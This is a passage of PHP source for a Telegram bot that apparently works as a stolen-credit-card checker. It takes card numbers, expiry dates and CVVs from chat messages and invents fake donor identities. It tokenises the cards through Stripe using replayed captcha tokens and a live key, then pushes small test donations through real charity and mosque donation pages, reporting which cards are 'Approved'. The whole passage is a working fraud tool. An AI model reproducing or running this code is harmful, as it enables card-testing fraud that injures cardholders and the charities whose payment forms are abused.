  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'g-recaptcha-token=03AFcWeA56hyuUamXT1086PZw6crImdzozgkcvyLG3afFGh_XsCem4lB39A-YV-bWQWRxf73KIdpEFUyRyXo-y0qz81I5bfFjoIL5mB3NBXwhTFQZ77ZP-ICCP2LwuV0slbCYNNVj8j2BUEikVKG2FY9XbZrX8AHLv6nnMkhKcV7kSJUJVcXHLl_l9S4BEylzRnY7t5Y04YgDpCWOrer0IW1_UYY-mA1Fikt2C9YRrNTmtnHBRx4JPkKUFfRKPdIJJ-9QBizGYIQ9AmZmRaokaZ4RWcdRKWcwv_LlYlTDyP0z3taC-V_u5td2K2tNNMv-koEh-dhcXY_2dZWJcfHj0AfPUdlAaokGv8u_Nvip_kT6aPuZnLXie8aKEFqHptDTlqLZowY_tPsgTxW7KGLMA-ndIlTgdWMV0YmiYiUxSqxfmUHmFSX--nnimLGOFEF4nCAtCQpQM1qlBOHeSG9lhsqsq6MstK6jckD7ogEguFIbCSFbFoNi9ZddHLUhQ0hx2NnAtrYKVXNKoC2LHR9qz_S3sgFskHnJnb1oMfsomFL7-IVtAl-uALakk5wkBBGBdSUIeWSrbkPoDORyiKH0o1t2v5Jd5pp0D0muQUQlT2_vGZSY-wXQLYvgRgrTcanwhTNiL-L7BCSQKVDflBBR1RLXwJpfw2ca5pM1PUGIRFednoYQ6lGnNywdbVymYk_MqwFO5r0_-tpcPqUxGUWITIED7o2B2FhUeeDJ7RHbtxHKrB15ygLfH-qVqt6zz29vfEEEVt-dZmz1DrUf70J_tZZ44UT89uZ-vmrZ0H6SPOhs_baQWZ_0pkwPIjY9R7nm8NEVV1uj7gSpYF0hkrBj5DVA1XtpnxarYeZsBhOmpQe2aLYBulibsHHu06bL6UHpJOlp18PGjt0GUMbmfzODS-HqleB2q2IdaWWoEN6YBj8QhtU0E3Jo4CYA&_action=donate&dOrderid='.$dOrderid.'&dFrequency=once&dAmount=1.00&dMethod=card&dCardProcessor=globalpayments&dCardtype='.$MV.'&dBankProcessor=&dIp=138.84.62.101&dAccept=text%2Fhtml%252Capplication%2Fxhtml%252Bxml%252Capplication%2Fxml%253Bq%253D0.9%252Cimage%2Favif%252Cimage%2Fwebp%252Cimage%2Fapng%252C%252A%2F%252A%253Bq%253D0.8&frequency=once&amount-flexible=1.00&confirmAmmount=1.00&name=&firstname=Carlos&lastname=Perez&address=6195+bollinger+rd&address-line2=&city=New+york&county=&country=US&postcode=10010&email=Dausitherer%40cuvox.de&mobile=%2B524179204022&custom-1=Social+Media&consent-email=1&cc-number='.$cc1.'&cc-exp-month='.$mes.'&cc-exp-year='.$ano.'&cc-csc='.$cvv.'&dCard3ds=auth_frictionless&eci=05&ds_trans_id='.$ds_trans_id.'&authentication_value='.$authentication_value.'',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'Origin: https://cbm.agitate.ie',
    'Accept-Language: es-US,es;q=0.6',
    'Referer: https://cbm.agitate.ie/donate/',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
preg_match('/(\d+: .*?)<\/p>/', $response, $match);
$respo = $match[1];

//EXTRAE EL TANKYOU//
if (empty($respo)){
preg_match('/<h1.*>(.*?)<\/h1>/', $response, $match);
$respo = $match[1];
}
//file_put_contents('/sdcard/index.html', $response);
curl_close($curl);

}
//echo "RESPO: $respo\n";

}

if (empty($respo)){
$respo = $status_reason ?? $status;
}
if (!empty($error)){
$respo = $error;
}

//echo "RESPO1: $respo\n";



$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}


if ($respo == '{"error":"Bad JSON Response"}') {
$respo = "Service Unavailable";
}
/*if ($respo == "SUCCEEDED"){
    $respo = "Charged $5";
}*/
$logo = "<a href='http://t.me/XNazunaBot'>[↯]</a>";

if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'Declined') !== false || strpos($respo, '107: Fails Fraud Checks') !== false || strpos($respo, '101: INVALID TRANS') !== false || strpos($respo, 'CARD_AUTHENTICATION_FAILED') !== false || strpos($respo, 'INVALID CARD') !== false || strpos($respo, 'UNABLE TO AUTH') !== false || strpos($respo, 'Card type is too long.Card type is invalid.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} elseif (strpos($respo, 'CHALLENGE_REQUIRED') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐑𝐞𝐣𝐞𝐜𝐭𝐞𝐝 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged €1\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: 𝐆𝐀𝐓𝐄 𝐄𝐑𝐑𝐎𝐑 ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
}

if ($live) {
    editMessage($chatId, $respuesta, $id_text);
} else {
    editMessage($chatId, $respuesta, $id_text);
}

//--------FIN DEL CHECKER MERCHAND - CHARGED--------/
ob_flush();


 }


	
	
	
	
	
	
	
if (preg_match('/^(!|\/|\.)go/', $message)) {

/*	$respuesta = "Gate no disponible por el momento !!!";
	sendMessage($chatId,$respuesta, $message_id);
	die();*/

$lista = substr($message, 4);

$i = preg_split('/[|:|\/ ]/', $lista);
$cc    = trim($i[0]);
$mes   = trim($i[1]);
$ano  = trim(substr($i[2], -2));
$cvv   = trim($i[3]);
$lista = "$cc|$mes|$ano|$cvv";

$bin = substr($lista, 0, 6);
$ma = "$mes/$ano1";
$card = "$cc$mes$ano$cvv";
$num = "$cc$mes$ano1$cvv";
//-----------------------------------------------------//


$longitud_cc = (substr($cc, 0, 2) == "37" || substr($cc, 0, 2) == "34") ? 15 : 16;
if (!is_numeric($cc) || strlen($cc) != $longitud_cc || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
    sendMessage($chatId, $respuesta, $message_id);
    die();
}



//Verifi//
/*
if (!is_numeric($cc) || strlen($cc) != 16 || !is_numeric($mes) || !is_numeric($ano) || !is_numeric($cvv)) {
    $respuesta = "🚫 Oops!\nUse this format: /go CC|MM|YYYY|CVV\n";
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}

*/

//----------------MENSAGE DE ESPERA-------------------//
$response = "<b>🕒 Wait for Result...</b>";
sendMessage($chatId, $response, $message_id, "HTML");  // Enviar el mensaje
//-----------EXTRAER ID DEL MENSAJE DE ESPERA---------//
$id_text = file_get_contents("ID");
//----------------------------------------------------//


$startTime = microtime(true); //TIEMPO DE INICIO
$BinData = BinData($bin); //Extrae los datos del bin


//RANDOM USER//
// Nombres
$names = array(
    'Juan', 'María', 'Pedro', 'Ana', 'Luis', 'Sofía', 'Carlos', 'Elena', 'Alejandro', 'Isabel'
);
// Apellidos
$lastNames = array(
    'García', 'Rodríguez', 'González', 'Martínez', 'Hernández', 'López', 'Díaz', 'Pérez', 'Sánchez', 'Ramírez'
);

// Números de teléfono
function generatePhoneNumber() {
    $areaCode = rand(200, 999);
    $prefix = rand(200, 999);
    $lineNumber = rand(1000, 9999);
    return "($areaCode) $prefix-$lineNumber";
}
// Generar datos
$name = $names[array_rand($names)];
$last = $lastNames[array_rand($lastNames)];
$phone = generatePhoneNumber();
// Imprimir datos
echo "Nombre: $name $lastName\n";
echo "Teléfono: $phone\n";


////SACA EL TOKEN//
$response = file_get_contents('https://www.fakemailgenerator.com');
preg_match('/value="([^"]+)"/', $response, $matches);
$GmailUser = $matches[1];
//---------------------------//
// Extraer el valor del dominio
preg_match('/<span id="domain">([^<]+)<\/span>/', $response, $matches);
$dominio = trim($matches[1]);
// Eliminar espacios en blanco
//---------------------------//
$usr = str_replace("@", "", $dominio);
//---------------------------//
$email = "$GmailUser$dominio";
	

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://goodbricksapp.com/icsd.org/donate',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'GET',
//  CURLOPT_COOKIE => 'AWSELB=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E54E6C6C74840B85EFFD64511979300976A3A882CC4D98A48BEB2C71440EACCBBB877341DEF0ADCE0E91BC9385D1660349C; AWSELBCORS=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E54E6C6C74840B85EFFD64511979300976A3A882CC4D98A48BEB2C71440EACCBBB877341DEF0ADCE0E91BC9385D1660349C; __stripe_mid=9ba4b24a-2af4-439e-a41d-920e0381036689ceab; __stripe_sid=453a6b5c-da6a-4251-9e1d-b527682f5d772b6c36',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Cache-Control: max-age=0',
    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile: ?1',
    'sec-ch-ua-platform: "Android"',
    'Upgrade-Insecure-Requests: 1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.6',
    'Sec-Fetch-Site: none',
    'Sec-Fetch-Mode: navigate',
    'Sec-Fetch-User: ?1',
    'Sec-Fetch-Dest: document',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
curl_close($curl);



$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://api.stripe.com/v1/tokens',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'guid=a5ff83d5-8f58-4ce3-bc66-46264d3217f072cfc5&muid=9ba4b24a-2af4-439e-a41d-920e0381036689ceab&sid=453a6b5c-da6a-4251-9e1d-b527682f5d772b6c36&referrer=https://goodbricksapp.com&time_on_page=23852&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiVm1SSmw2aVlRMUFsVFk4VlY0bGpGek12SkRaTktXMWxIei9ickxDUU5JRE5MdVZWSHZaeWNNRzRUSzlRS0RvUWNKai90RmhRZHpvWmRjbHRYSHZZZmhmazQ2ekxoN0NVSEdGYk5CWkRQcmdEa1ZzbWd3SXM5YnIrRCtIVGU3TDBrKzdQWVlOWlppb0xXMU1MS2Y1NTJ0Tm4rU0pHVEpQM0RPb2VMUHhKUWFWVU11Sk8yeHMrNGRsdFMyTU9uQ0RlWHgvRkd5WkxCbHJ2TnZka3ZOd2hUYTRONExWQ3BuKzRYWFVOWUZobSt4RFEzNmNuRmw0RVR2cXhCWmoxci90c3hsSVJwTzR6Ri9xeEFBS1pCZi96YzhTamxEZE9mMGNHRVIveXBiclNxOHVkWEc5aDhYNldleDZoV2FFNHJMVXdwcXFjd0grdTM5RmRvWHp3d00zaDZRT1lTZzd0OWJRYUdqdG00YVI3VCtMeGMyN3Y5L21LbjlQb0prRXpWU3pGUHVDd09aVjJMY2RqSUVlM0lHbzk4N1c3SkhmVUV1L2tENGZ5M2xFVkpVaWMydkVLWG1QV2YrNVNFd0hFTU1PNjB5empoNXlPb1pDaHpNOCs0eHBONDZYZzhQSlhGck44T09UdENpZHE5cnhycC9iby9xcE1IcnNMUkpJWStNekY4bUE3YXMrWTUvQUZjd3ppSGRpZi9hQXdiOG5BMitKc0ZqZ0xZaFI2b0JzRkh3YUEyZ2JwOVBoYm5hc29WQnFHQ0JYZVE5STFzVnJSVno4NE9hTm5OZmZPNjVIcDZvcmFtTlFzVmFvWi82RmhBVFYvMUZEYWJMU200eE9KTG9FVFIzcjIvTkZibkZodjVKZlFBU3M0Mmo4cVc5akhoQXUvbkg4RUdWRkh3b3kwOUdVckFiS3NGM09IU1ZSVWNuUEhGU2l5RGJSckRtVFZCTStZcElESUhCZmp6b1RocWZDelYvM2ZMdmMrTXQyNXJmWFp2bXhnTUFwYnNLUXNsbjBwZDIyVTFTV0JlWWtISDlJbi9oQkpocWV3WGpBVlVRanhZbGhOSEpqb05oYmFZYUdLSU5NRHRPdnVDQlhqVEpGaUc0anRzL2cyZXdTMks5TUc2QWg5RzBpK05HZDBIMm0vQW9tUWZGQ1VqOFQ3K2g4cDhNMHZWWllHcFR3bGFBRlNULzhzdGtGM3BVVnd0cHYzUVl2ekFwN1BoUjNVNUVvZnFDWEp3cTc4RkJYK2YvdWlITWx0Zjh4NVQ2cGxvcTF6bktUZFlnNHBaOGJUb0IwSG1FbEpGRW04eWpVdmQva3lGK0tQaTdINEVJM1NZOVlPSzZ2a1g2R1NvWVhVOVV6VjBnU3Y3SmNOalBzaVU0RVpsVHdwWmNrZlJLTkZ1Z3dyUTErQVczQ0JGdE42ZzBSNVc1NUM4cFI2ZGtGRFNBMHUrb2FtY1VQYTUrOGd2anYxOHlveXEvOWZkYnhpQk9INjNBYzZOZ1MvdnBqWDExSmY2dUVmWUltT0lFSC9ZYjZ3c1dnNWRzQndZK0xrWFNkUEMwRUhCUlo5N2h2Ty9qNnBqczFrN1J6Q3BtWWJ2VEh2QWhRWFI0YjRSa05oY0RjcUVEbHFDNnhER3h0ZURBZVFDZFR3Zzd5Y3hEMmQ4TEdGSFkrRGZJcm1FYnA3R0FJamp4UFdvTTZCdHZNdWZETE5HZncxTnIwMkRLQisrbkVZWjhhOWlTTUNqRjMvV05BQmlUVnQyT2JmMUUxakQ4dVArV09UdHFNbGtPcnIxdWNJaTZpaVJnNGVIVGk1UzdBMEZZeGZLRDhsZ3hUTEpCbk1odU1KOHlBTE9hYkxtaDJteXp0Zitkc045UG1nNWR3UnJibFArUTlNdGNEUHhjS3pGdGNVZlRaU3E0TVZiNjZPU01qR0YwUFZtV0NwT2Y2OUoyaEhBcmhUK1h2dmdBN0Iwcld0c2NONUgzQlZaS1R6cTRPZmJhQzJHUFYxa24wU2Ntd1FWTEN2RlNXMnNGY2F0MUFPSG9TNkRtVlVHOWlyZDl4ZFBvQUJISkZsT3A4aWRHWk9ZSEFOTnRaekVkVmkyVVYwdjZCK1dJTWIyb2tlY0xkK1FyaDNzQkkza2M0TDdzVmtEYy9sV3Q1dHQ3T1E0WktndFBsUm1VZmcvcHJXWkMxMnc5MTNNMUZtVFZxeFIrd053RElsOU5ad29VamtqTXVaQ3RRRmtFRlFteFhScldJN3JQb0pZbFdwUERzNFdBVTZURmRnQlAxcGk5Q3R2R2F2UnA2UUhpTlJtUkVkUlB4S1MrV2dNcitLOFlMZ0tjZkkzWUdrUlQ2eFQrZ3lRQVNzeWxBU1VoMkVNSXl0b29mQ1FZdzV4WXZzZmg3MVpMbmc5OUNhYXVndlJyelRHSEJrV01Fbi9IYXdLSU1JeGFpa3A3N0dDdmJqZU5PYkh3UVZRZGJWOERqQU1mTzhRZVpIQjNPT25FQkFrT09Rbi81ZFVobFlTWjRuZ0tpL2VVUVdqUlJWaThnZm95SXJzUDRtUW9mV1VMVThiTXkzT3VVd3ZWS2hNNjlnME9yQ1VidGZQNzNkSXhIU1Q2YUg1bzMyaXoreGw5Y0JxTUtobkpyeDdMZjJqTkY5RnZwakN3VDZ6c3lsSStBWEtUNFplRmdJQ1JrZjZuUlhXTnlqMGMwKzQ4MzNvbXIwL0g2YVhaa0RBU3U5ZjU1UGw0eG9PaVZYeHIyak52YWdLTkt0VTY0S2F3PT0iLCJleHAiOjE3NDU0Mzc3ODcsInNoYXJkX2lkIjoyMjE5OTYwNzMsImtyIjoiM2RiZGFiNDYiLCJwZCI6MCwiY2RhdGEiOiJnMHE1Qm5vc2YzaEtWZmtNbGE2TE9iNUxOVlQwdDhxQ0czbWtwMkdIKzY3YjlmcnRWWE04bHBsMENVSFZhako3L0VoVGhXcy9mdEk4emV0RkFIbUlBNTBvczl3RjNEQkRReHlySDFpWHg1TVduN3NlTEFsWmo1bnpMWEJ3NTY1SlhHVWZiQWdqZnRoeEI1NjRqOCtiMmhpTWQ5SzBkVjFxUzUzczNuMjlsa29pbEp6blZLVlV4cnYzYlZBaDRubjFGaXVuMzNEa0Y3clNlemhkIn0.b8TxuC6YySDuu_B4dcwCqlV6ltGNaAf1u1xglZqBcSs&payment_user_agent=stripe.js/d2577f3d23; stripe-js-v3/d2577f3d23; card-element&key=pk_live_41FIHoENH2ilJLW1pkGdu3wb',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
    'Accept: application/json',
    'Accept-Encoding: gzip, deflate, br, zstd',
    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'sec-ch-ua-mobile: ?1',
    'sec-gpc: 1',
    'accept-language: es-US,es;q=0.6',
    'origin: https://js.stripe.com',
    'sec-fetch-site: same-site',
    'sec-fetch-mode: cors',
    'sec-fetch-dest: empty',
    'referer: https://js.stripe.com/',
    'priority: u=1, i',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);
$id = $json["id"];
$ip = $json["client_ip"];
curl_close($curl);

echo "$id\n";
//---------------PRUEBA LAS CCS EN PAGINA DE DONACION---------------//

$curl = curl_init();
curl_setopt_array($curl, [
  CURLOPT_URL => 'https://goodbricksapp.com/icsd.org/donate',
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_ENCODING => '',
  CURLOPT_MAXREDIRS => 10,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
  CURLOPT_CUSTOMREQUEST => 'POST',
  CURLOPT_POSTFIELDS => 'g-recaptcha-response=03AFcWeA65bHNOmDSPdG_9gB6c9EX9zSMnjWrR27HXOwDFJS1LJ4aePWFq2uf8mKssZYu7FHz8O76-1iQwTBcX2qX1HYb8UeAzRZNYkDoHMQ-c_ojltBWijO6cWa2TlKL0Guq97UV2-T0O85Xzx33C7j8WTd5EGElpt5u2ws8KXYgyL1DQA-PHXhj_eVR6SAxXKyHYVzPCavKzav1PrQKY5TALYmaqdGDmmmxzVaAdi0PfgNPg96UTEPrWunRAToUbB4j0q19FRsWi82Aj5n3QZaCxiDzaoog0oWY-M12AMuhsGkMnoL6R8__vk7NJvpEq2IFnsplix1xBrkNnEWsyPhgoRq0Ew13-sY1CUWd-LZMOpIbK97lCObapeTYk0WL9Ge4t3QjctJvnmqfadMZR8GuI_az9hfK3x9wx9JbN6_91Wy8EWXwQB4Bi1eqkqFWMlpuMnfNq6tPPDvAMny9MHQV9e1UIM0S5V8YJCmzO9hfkN-1hTEoPKssCV5DkKVUZOyqwwfI_a1XUXKP66duM4lPkwnS6HzQyoXxCRtTXUWHuFhYuM92d74jmBLGiYzk5E4UyfJlJMFOQKDybNtnl4ejBBbRxwHr-nZFRHZ9nYA5AcrHSn5_OOqsw3XqK51p-Z-NDlvdtbrQ6tnHKioNZm04-KBv54JJSeJeIbP9OCcvJmrgqggDplvTyPIrLHChE-KZkoIlZiHPcpI8pLwnsBl9tpofw-naN_FS3rJb-s2fJV1sslyw0WFeJtiMH8Y2Jn-FE4b7YdvTxSvWvkhiMnAZeYz1nqqLTAO5Y9a0fpCSZVfrsAPQD_U697yodO0C23pm6UoAft8aJRmw_k-pWR3vhIkSzrA4QVi962k_ZbhEAT01tdscFeN5dE4-f6K7crguxy7WrzpyeRtK9VJsUzTJvQDkDb4RBmXX2Y75P-d9qMCjsgSDg5UgwHUI7E8baYkKb7b7Y69JfkvQzAxTE5YJJ3BgD-ugE2Q&token='.$id.'&clientIp='.$ip.'&categoryAmount=5&paymentIterations=0&categoryName=masjid-operations-2025&firstName='.$name.'&lastName='.$last.'&email='.$email.'&customerEmailValidation=&phone='.$phone.'&addressStreet=&addressApt=&addressCity=&addressState=&addressZipCode=',
  CURLOPT_COOKIEFILE => getcwd().'/cookie.txt',
  CURLOPT_COOKIEJAR => getcwd().'/cookie.txt',
//CURLOPT_COOKIE => 'AWSELB=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E54E6C6C74840B85EFFD64511979300976A3A882CC4D98A48BEB2C71440EACCBBB877341DEF0ADCE0E91BC9385D1660349C; AWSELBCORS=3BCDDBFC041DF2CB93B1F636C2A3E3B1969F2E54E6C6C74840B85EFFD64511979300976A3A882CC4D98A48BEB2C71440EACCBBB877341DEF0ADCE0E91BC9385D1660349C; __stripe_mid=9ba4b24a-2af4-439e-a41d-920e0381036689ceab; __stripe_sid=453a6b5c-da6a-4251-9e1d-b527682f5d772b6c36',
  CURLOPT_HTTPHEADER => [
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36',
    'Accept-Encoding: gzip, deflate, br, zstd',
//    'Content-Type: application/x-www-form-urlencoded',
    'sec-ch-ua-platform: "Android"',
    'X-Requested-With: XMLHttpRequest',
    'sec-ch-ua: "Brave";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
    'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
    'sec-ch-ua-mobile: ?1',
    'Sec-GPC: 1',
    'Accept-Language: es-US,es;q=0.6',
    'Origin: https://goodbricksapp.com',
    'Sec-Fetch-Site: same-origin',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Dest: empty',
    'Referer: https://goodbricksapp.com/icsd.org/donate',
  ],
]);

$response = curl_exec($curl);
$err = curl_error($curl);
$json = json_decode($response, true);

$respo = '';

if (isset($json['status'])) {
    $respo = $json['status'];
} elseif (isset($json['message'])) {
    $messages = explode(';', $json['message']);
    $respo = trim($messages[0]);
} else {
    preg_match('/<p>(.*?)<\/p>/', $response, $matches);
    if (isset($matches[1])) {
        $respo = trim($matches[1]);
    } else {
        $respo = 'Service Unavailable';
    }
}

curl_close($curl);
	
$timetakeen = (microtime(true) - $startTime);
$time = substr_replace($timetakeen, '', 4);
$proxy = "LIVE ✅";

$bin = "<code>".$bin."</code>";
$lista = "<code>".$lista."</code>";


if (empty($respo)) {
        $respo = $response;
}
if ($respo == "SUCCEEDED"){
    $respo = "Charged $5";
}
// Aquí podrías guardar $responseLog en un archivo o base de datos para depuración

	
	unlink('cookie.txt');
//\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."

$retri = handleComando($card); //Checa cuntas veces se calo la misma ccs//
	
if (array_in_string($respo, $live_array)) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Approved! ✅\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = True;
} elseif (strpos($respo, 'This transaction cannot be processed.') !== false || strpos($respo, 'Your card was declined.') !== false) {
    $respuesta = "𝘎𝙖𝙩𝙚𝙬𝙖𝙮  ➟ Charged 5$\n- - - - - - - - - - - - - - - - - - - - - - - - - -\n".$logo." 𝐂𝐚𝐫𝐝: ".$lista."\n".$logo." 𝐒𝐭𝐚𝐭𝐮𝐬: Declined ❌\n".$logo." 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ".$respo."\n".$BinData."\n—————✧◦⟮ɪɴғᴏ⟯◦✧—————\n".$logo." 𝐏𝐫𝐨𝐱𝐲: ".$proxy."\n".$logo." 𝐑𝐞𝐭𝐫𝐢𝐞𝐬: ".$retri."\n".$logo." 𝐓𝐢𝐦𝐞 𝐓𝐚𝐤𝐞𝐧: ".$time."'Seg\n".$logo." 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐁𝐲: @".$user." - ".$tipo."\n".$logo." 𝐁𝐨𝐭 𝐁𝐲: ".$admin."\n——————✧◦么◦✧——————\n";
    $live = False;
} else {
